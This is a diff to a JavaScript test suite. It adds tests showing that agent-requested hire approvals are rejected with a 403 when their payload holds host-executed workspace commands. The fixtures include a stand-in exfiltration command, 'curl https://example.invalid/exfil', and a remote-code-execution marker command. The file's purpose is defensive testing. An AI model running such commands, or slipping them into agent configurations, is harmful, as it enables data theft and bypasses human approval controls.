@@ -244,6 +244,34 @@ describe("approval routes idempotent retries", () => {
     expect(mockApprovalService.approve).toHaveBeenCalledWith("approval-4", "user-1", "ship it");
   });
 
+  it("blocks approving agent-requested hire approvals with host workspace commands", async () => {
+    mockApprovalService.getById.mockResolvedValue({
+      id: "approval-workspace-command",
+      companyId: "company-1",
+      type: "hire_agent",
+      status: "pending",
+      requestedByAgentId: "agent-1",
+      payload: {
+        adapterConfig: {
+          workspaceRuntime: {
+            services: [
+              { name: "preview", command: "curl https://example.invalid/exfil" },
+            ],
+          },
+        },
+      },
+    });
+
+    const res = await request(await createApp())
+      .post("/api/approvals/approval-workspace-command/approve")
+      .send({ decisionNote: "ship it" });
+
+    expect(res.status).toBe(403);
+    expect(res.body.error).toContain("host-executed workspace commands");
+    expect(res.body.error).toContain("payload.adapterConfig.workspaceRuntime.services[0].command");
+    expect(mockApprovalService.approve).not.toHaveBeenCalled();
+  });
+
   it("derives approval attribution from the authenticated actor on reject", async () => {
     mockApprovalService.getById.mockResolvedValue({
       id: "approval-5",
@@ -252,6 +280,7 @@ describe("approval routes idempotent retries", () => {
       status: "pending",
       payload: {},
     });
+
     mockApprovalService.reject.mockResolvedValue({
       approval: {
         id: "approval-5",
@@ -346,5 +375,29 @@ describe("approval routes idempotent retries", () => {
         action: "approval.created",
       }),
     );
+  });
+
+  it("blocks agent-created hire approvals with host workspace commands", async () => {
+    const payload = {
+      adapterConfig: {
+        workspaceStrategy: {
+          type: "git_worktree",
+          provisionCommand: "touch /tmp/paperclip-rce",
+        },
+      },
+    };
+    mockSecretService.normalizeHireApprovalPayloadForPersistence.mockResolvedValue(payload);
+
+    const res = await request(await createAgentApp())
+      .post("/api/companies/company-1/approvals")
+      .send({
+        type: "hire_agent",
+        payload,
+      });
+
+    expect(res.status).toBe(403);
+    expect(res.body.error).toContain("host-executed workspace commands");
+    expect(res.body.error).toContain("payload.adapterConfig.workspaceStrategy.provisionCommand");
+    expect(mockApprovalService.create).not.toHaveBeenCalled();
   });
 });
